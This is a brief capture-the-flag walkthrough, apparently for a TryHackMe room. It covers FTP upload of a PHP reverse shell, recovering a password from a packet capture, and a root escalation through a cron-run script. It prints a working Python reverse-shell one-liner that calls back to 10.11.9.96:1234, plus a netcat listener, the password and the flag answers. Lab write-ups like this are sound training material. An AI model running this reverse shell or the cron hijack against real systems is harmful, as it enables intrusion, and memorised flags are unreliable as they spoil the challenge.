# ingredient

ftp into the machine  
put php reverse shell and linpeas in the ftp folder  
recipe.txt --> secret ingredient  
<details>
<summary>ingredient</summary>
love
</details>

# user.txt

in the incidents folder is a wireshark capture  
download it from the ftp folder  
use wireshark to scroll through all tcp entries  
find a login attempt from lennie `c4ntg3t3n0ughsp1c3`  
ssh with lennie and the password and find the flag  
<details>
<summary>user.txt</summary>
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
</details>

# root.txt

found /scripts/startup_list.sh in lennies home folder -> cronjob that executes /etc/print.sh as root every minute  
put a reverse shell in the file `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.9.96",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'` `nc -lvnp 1234`  
<details>
<summary>root.txt</summary>
THM{f963aaa6a430f210222158ae15c3d76d}
</details>

